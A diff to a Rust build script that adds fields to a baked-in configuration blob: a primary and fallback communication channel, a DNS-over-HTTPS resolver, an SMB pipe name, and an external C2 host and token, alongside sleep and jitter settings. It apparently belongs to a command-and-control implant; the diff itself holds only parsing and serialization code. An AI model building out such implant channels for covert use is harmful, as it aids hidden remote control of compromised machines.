@@ -106,6 +106,8 @@ fn bake_config() {
 
     // Serialize into the binary blob the runtime `wire::Reader` decodes.
     // Layout: str(host) | u16(port) | str(uri) | u32(sleep) | u8(jitter) | u8(tls)
+    //         | u8(primary_channel) | u8(fallback_bitmap)
+    //         | str(doh_resolver) | str(smb_pipe_name) | str(extc2_api_host) | str(extc2_token)
     // (matches config::Config::decode). str = u32-LE length prefix + bytes.
     let mut blob: Vec<u8> = Vec::new();
     write_str(&mut blob, cfg.host.as_bytes());
@@ -114,6 +116,13 @@ fn bake_config() {
     write_u32(&mut blob, cfg.sleep_seconds);
     blob.push(cfg.jitter_pct);
     blob.push(u8::from(cfg.use_tls));
+    // Channel dispatcher fields (spec-1):
+    blob.push(cfg.primary_channel);
+    blob.push(cfg.fallback_bitmap);
+    write_str(&mut blob, cfg.doh_resolver.as_bytes());
+    write_str(&mut blob, cfg.smb_pipe_name.as_bytes());
+    write_str(&mut blob, cfg.extc2_api_host.as_bytes());
+    write_str(&mut blob, cfg.extc2_token.as_bytes());
 
     let out_dir = env::var("OUT_DIR").unwrap();
 
@@ -509,6 +518,13 @@ struct ConfigVals {
     sleep_seconds: u32,
     jitter_pct: u8,
     use_tls: bool,
+    // Channel dispatcher config (spec-1):
+    primary_channel: u8,
+    fallback_bitmap: u8,
+    doh_resolver: String,
+    smb_pipe_name: String,
+    extc2_api_host: String,
+    extc2_token: String,
 }
 
 /// Minimal TOML-ish parser. Only understands `key = "value"` (strings) and
@@ -521,6 +537,13 @@ fn parse_config(text: Option<&str>) -> ConfigVals {
     let mut sleep_seconds = Defaults::SLEEP;
     let mut jitter_pct = Defaults::JITTER;
     let mut use_tls = Defaults::TLS;
+    // Channel dispatcher defaults (spec-1):
+    let mut primary_channel: u8 = 0; // Https
+    let mut fallback_bitmap: u8 = 0; // no fallback
+    let mut doh_resolver = String::new();
+    let mut smb_pipe_name = String::new();
+    let mut extc2_api_host = String::new();
+    let mut extc2_token = String::new();
 
     if let Some(t) = text {
         for raw in t.lines() {
@@ -566,6 +589,36 @@ fn parse_config(text: Option<&str>) -> ConfigVals {
                         use_tls = false;
                     }
                 }
+                "primary_channel" => {
+                    if let Ok(n) = val.parse() {
+                        primary_channel = n;
+                    }
+                }
+                "fallback_bitmap" => {
+                    if let Ok(n) = val.parse() {
+                        fallback_bitmap = n;
+                    }
+                }
+                "doh_resolver" => {
+                    if let Some(s) = unquote(val) {
+                        doh_resolver = s;
+                    }
+                }
+                "smb_pipe_name" => {
+                    if let Some(s) = unquote(val) {
+                        smb_pipe_name = s;
+                    }
+                }
+                "extc2_api_host" => {
+                    if let Some(s) = unquote(val) {
+                        extc2_api_host = s;
+                    }
+                }
+                "extc2_token" => {
+                    if let Some(s) = unquote(val) {
+                        extc2_token = s;
+                    }
+                }
                 _ => {}
             }
         }
@@ -578,6 +631,12 @@ fn parse_config(text: Option<&str>) -> ConfigVals {
         sleep_seconds,
         jitter_pct,
         use_tls,
+        primary_channel,
+        fallback_bitmap,
+        doh_resolver,
+        smb_pipe_name,
+        extc2_api_host,
+        extc2_token,
     }
 }
 
